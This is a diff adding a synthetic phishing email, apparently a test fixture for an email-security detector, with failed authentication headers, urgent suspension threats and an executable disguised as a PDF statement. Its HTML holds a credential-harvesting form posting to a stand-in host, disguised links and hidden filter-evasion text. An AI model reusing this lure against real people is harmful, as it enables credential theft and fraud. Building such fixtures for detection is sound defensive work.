@@ -1,0 +1,66 @@
+MIME-Version: 1.0
+Date: Mon, 3 Mar 2026 09:30:00 +0530
+Message-ID: <test123@suspicious-domain.example.com>
+Subject: URGENT: Your Account Will Be Suspended - Action Required Immediately
+From: "Security Team" <security@bank-secure-verify.tk>
+To: victim@example.com
+Reply-To: phisher@malicious-domain.xyz
+Return-Path: <bounces@spammer-server.net>
+Received: from mail-server.example.com (mail-server.example.com [93.184.216.34])
+        by mx.example.com with ESMTPS id abc123
+        for <victim@example.com>;
+        Mon, 3 Mar 2026 09:30:00 +0530
+Received-SPF: fail (domain bank-secure-verify.tk does not designate 93.184.216.34 as permitted sender)
+Authentication-Results: mx.example.com;
+        spf=fail smtp.mailfrom=bank-secure-verify.tk;
+        dkim=fail header.d=bank-secure-verify.tk;
+        dmarc=fail header.from=bank-secure-verify.tk
+DKIM-Signature: v=1; a=rsa-sha256; d=bank-secure-verify.tk; s=selector1;
+        h=from:to:subject:date;
+        bh=abc123==;
+        b=xyz789==
+X-Mailer: PhishKit v3.2
+Content-Type: multipart/mixed; boundary="boundary123"
+
+--boundary123
+Content-Type: text/html; charset="UTF-8"
+
+<html>
+<body>
+<p>Dear Customer,</p>
+
+<p>We have detected <b>unusual activity</b> on your account. Your account has been temporarily locked due to suspicious activity detected from an unauthorized location.</p>
+
+<p><b>You must verify your identity within 24 hours</b> or your account will be permanently suspended and all funds will be frozen.</p>
+
+<p>Please <a href="http://bank-secure-verify.tk/login/verify?user=victim">click here to verify your account</a> immediately.</p>
+
+<p>Alternatively, you can update your payment information at:
+<a href="http://192.168.1.1:8080/phishing-page/steal-credentials.php">https://www.legitimate-bank.com/secure/verify</a></p>
+
+<p>If you fail to comply within 24 hours, legal action may be taken and law enforcement will be notified.</p>
+
+<p>Reset your password here: <a href="http://evil-site.ru/reset?token=abc123">Reset Password</a></p>
+
+<form action="http://steal-data.example.com/capture" method="POST">
+  <input type="text" name="username" placeholder="Enter your username" />
+  <input type="password" name="password" placeholder="Enter your password" />
+  <button type="submit">Verify Account</button>
+</form>
+
+<div style="display:none">This hidden text is used to evade spam filters and contains random words to alter email hash signatures.</div>
+
+<p>Sincerely,<br>
+The Security Team<br>
+Legitimate Bank Corp.</p>
+</body>
+</html>
+
+--boundary123
+Content-Type: application/pdf; name="Account_Statement.pdf.exe"
+Content-Disposition: attachment; filename="Account_Statement.pdf.exe"
+Content-Transfer-Encoding: base64
+
+SGVsbG8gV29ybGQ=
+
+--boundary123--
